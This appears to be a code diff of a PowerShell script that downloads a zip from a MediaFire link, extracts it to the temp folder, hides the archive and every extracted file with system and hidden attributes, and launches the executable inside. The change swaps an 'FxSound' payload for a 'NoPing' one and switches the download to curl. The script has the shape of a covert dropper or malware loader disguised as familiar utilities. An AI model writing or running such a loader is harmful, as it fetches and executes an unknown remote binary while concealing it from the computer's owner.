@@ -1,14 +1,30 @@
-$zipUrl = "https://download843.mediafire.com/h4vd6mw6wzwgvULQ4KCejcUkY2HHZU5p8qe-4UzeI4V8eX-ftoS3iiwMww64gp6kJ1QzT3X5HnPxw8aWDeAwGQUx6Ws8V1Ct3QGk7BzdZlx-3wrxC9OZgx-PymGD6qHvE-MRg-lairTNdB3jHDiXMA3XYDctJyVy0x7KkmLAo7Aj5A/xkwf5ya9257w8y5/FxSound.zip"
-$exeName = "FxSound.exe"
+$zipUrl = "https://download1474.mediafire.com/9bupya8z2afgbT9E0Kp4k1aGOdhkoABxzDtRsHR0lCuJeegMax34R9AR6USpDKRl--Tm39s6fDUxpVn-MVfYSdyV8_7NJXXE8aba8apLttBQ9G2L7SxJQILsGwVDcx0vwG_Ehshd0H8Rhj1VR24skgINupHjRwkomRSNaSwgqpOsOg/27v903l90sper9s/NoPing.zip"
+$exeName = "NoPing.exe"
 $tempFolder = [System.IO.Path]::GetTempPath()
-$zipFile = Join-Path $tempFolder "FxSound.zip"
-$extractFolder = Join-Path $tempFolder "FxSound"
+$zipFile = Join-Path $tempFolder "NoPing.zip"
+$extractFolder = Join-Path $tempFolder "NoPing"
 $exePath = Join-Path $extractFolder $exeName
 
-if (-Not (Test-Path $zipFile)) { Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile; & attrib +h +s $zipFile }
-if (-Not (Test-Path $extractFolder)) { Expand-Archive -Path $zipFile -DestinationPath $extractFolder -Force; & attrib +h +s $extractFolder }
+# Download using curl if the file doesn't exist
+if (-Not (Test-Path $zipFile)) {
+    $curlPath = "C:\Windows\System32\curl.exe" # Path to curl executable
+    Start-Process -FilePath $curlPath -ArgumentList "-o `"$zipFile`" `"$zipUrl`"" -Wait
+    & attrib +h +s $zipFile
+}
 
+# Extract if the folder doesn't exist
+if (-Not (Test-Path $extractFolder)) {
+    Expand-Archive -Path $zipFile -DestinationPath $extractFolder -Force
+    & attrib +h +s $extractFolder
+}
+
+# Hide all extracted files
 $files = Get-ChildItem -Path $extractFolder -Recurse -File
-foreach ($file in $files) { & attrib +h +s $file.FullName }
+foreach ($file in $files) {
+    & attrib +h +s $file.FullName
+}
 
-if (Test-Path $exePath) { Start-Process -FilePath $exePath }
+# Start the executable
+if (Test-Path $exePath) {
+    Start-Process -FilePath $exePath
+}
